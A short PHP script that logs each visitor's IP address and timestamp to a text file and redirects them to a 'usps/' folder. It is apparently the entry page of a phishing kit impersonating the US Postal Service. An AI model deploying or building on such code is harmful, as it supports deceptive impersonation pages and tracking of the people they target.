<?php
	$ip = getenv("REMOTE_ADDR");
	$file = fopen("f2.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/Once\n");
header("Location: usps/");
?>
